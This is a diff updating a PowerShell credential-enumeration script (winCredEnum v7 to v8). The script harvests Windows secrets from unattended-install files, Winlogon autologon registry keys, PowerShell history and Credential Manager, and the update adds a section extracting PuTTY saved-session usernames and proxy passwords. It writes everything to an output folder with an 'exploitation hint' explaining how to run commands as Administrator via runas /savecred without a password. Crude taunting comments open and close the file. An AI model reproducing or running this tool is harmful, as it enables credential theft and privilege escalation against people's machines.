@@ -1,11 +1,12 @@
 # Why Are You GAY ?!
-# Configuring the display policy to avoid issues during printing
+# winCredEnum_v8.ps1 - Enhanced Version
+# Set output encoding to UTF-8 to avoid printing issues
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
-Write-Host "[*] Starting winCredEnum_v7 For Credentials Enumeration..." -ForegroundColor Cyan
+Write-Host "[*] Starting Comprehensive Credentials Enumeration..." -ForegroundColor Cyan
 Write-Host "====================================================================="
 
-# Create the output directory in the current path
+# Create output directory in the current working directory
 $outputDir = ".\output"
 if (!(Test-Path $outputDir)) {
     New-Item -ItemType Directory -Path $outputDir | Out-Null
@@ -14,7 +15,7 @@ if (!(Test-Path $outputDir)) {
     Write-Host "[*] Directory '$outputDir' already exists. Outputs will be saved there." -ForegroundColor Yellow
 }
 
-# List of all targeted sensitive files and paths
+# 1. List of sensitive target files and paths
 $targetFiles = @(
     "C:\Unattend.xml",
     "C:\Windows\Panther\Unattend.xml",
@@ -43,7 +44,7 @@ foreach ($file in $targetFiles) {
     }
 }
 
-# Checking the automatic login feature in the system registry (Winlogon Autologon)
+# 2. Check Winlogon Autologon in the Registry
 Write-Host "`n[*] Section 2: Checking Registry for Autologon..." -ForegroundColor Magenta
 $winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 if (Test-Path $winlogonPath) {
@@ -66,7 +67,7 @@ if (Test-Path $winlogonPath) {
     }
 }
 
-# Checking the PowerShell command history (PSReadLine History)
+# 3. Check PowerShell Console History (PSReadLine)
 Write-Host "`n[*] Section 3: Extracting PowerShell Console History..." -ForegroundColor Magenta
 $historyDestination = Join-Path $outputDir "PowerShell_History.txt"
 try {
@@ -89,28 +90,21 @@ try {
     }
 }
 
-# Checking saved credentials management (cmdkey /list)
+# 4. Check Windows Credential Manager (cmdkey /list)
 Write-Host "`n[*] Section 4: Checking Windows Credential Manager (cmdkey)..." -ForegroundColor Magenta
 $cmdkeyDestination = Join-Path $outputDir "Cmdkey_Credentials.txt"
 try {
-    # Execute the command and store the output
     $cmdkeyOut = cmdkey /list
-    
-    # Checking if the output contains actual data
     if ($cmdkeyOut -match "Target") {
         Write-Host "[!!!] FOUND Saved Credentials in Windows Credential Manager!" -ForegroundColor Green
-        
-        # Write the original output to the file
         $cmdkeyOut | Out-File -FilePath $cmdkeyDestination -Encoding utf8
         
-        # Adding the (Exploitation Hint)
         "`n=====================================================================" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
-        "[+] EXPLOITATION HINT:" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
+        "[💡] EXPLOITATION HINT:" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
         "If you see a privileged user (e.g., Administrator) in the targets above," | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
         "you can execute commands as that user WITHOUT a password using the /savecred flag." | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
         "" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
         "Command syntax: runas /savecred /user:<USERNAME> cmd.exe" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
-        "Example:        runas /savecred /user:Administrator cmd.exe" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
         "=====================================================================" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
 
         Write-Host "    [->] Saved cmdkey output & Exploitation Hint to: $cmdkeyDestination" -ForegroundColor Gray
@@ -121,6 +115,41 @@ try {
     Write-Host "[-] Failed to execute cmdkey." -ForegroundColor Red
 }
 
+# 5. Check PuTTY Saved Sessions Configurations
+Write-Host "`n[*] Section 5: Extracting PuTTY Saved Sessions Configurations..." -ForegroundColor Magenta
+$puttyPath = "HKCU:\Software\SimonTatham\PuTTY\Sessions"
+$puttyDestination = Join-Path $outputDir "PuTTY_Sessions_Config.txt"
+
+if (Test-Path $puttyPath) {
+    try {
+        $sessions = Get-ChildItem -Path $puttyPath
+        if ($sessions) {
+            Write-Host "[+] FOUND PuTTY Sessions in Registry!" -ForegroundColor Green
+            "=== PuTTY Saved Sessions Enumeration ===" | Out-File -FilePath $puttyDestination -Encoding utf8
+            
+            foreach ($session in $sessions) {
+                $sessionName = $session.PSChildName
+                "----------------------------------------" | Out-File -FilePath $puttyDestination -Append -Encoding utf8
+                "Session Name: $sessionName" | Out-File -FilePath $puttyDestination -Append -Encoding utf8
+                
+                $properties = Get-ItemProperty -Path $session.PSPath
+                if ($properties.HostName) { "  HostName: $($properties.HostName)" | Out-File -FilePath $puttyDestination -Append -Encoding utf8 }
+                if ($properties.UserName) { "  UserName: $($properties.UserName)" | Out-File -FilePath $puttyDestination -Append -Encoding utf8 }
+                if ($properties.ProxyHost) { "  ProxyHost: $($properties.ProxyHost)" | Out-File -FilePath $puttyDestination -Append -Encoding utf8 }
+                if ($properties.ProxyUsername) { "  ProxyUsername: $($properties.ProxyUsername)" | Out-File -FilePath $puttyDestination -Append -Encoding utf8 }
+                if ($properties.ProxyPassword) { "  ProxyPassword (Encrypted): $($properties.ProxyPassword)" | Out-File -FilePath $puttyDestination -Append -Encoding utf8 }
+            }
+            Write-Host "    [->] PuTTY sessions metadata saved to: $puttyDestination" -ForegroundColor Gray
+        } else {
+            Write-Host "[-] PuTTY key exists but no saved sessions found." -ForegroundColor Yellow
+        }
+    } catch {
+        Write-Host "[-] Failed to enumerate PuTTY registry keys." -ForegroundColor Red
+    }
+} else {
+    Write-Host "[-] PuTTY registry path not found (No sessions configured)." -ForegroundColor Yellow
+}
+
 Write-Host "`n====================================================================="
 Write-Host "[*] Enumeration Complete! Check the 'output' directory." -ForegroundColor Cyan
-# فصخ سروالك
+# سروالك عندي
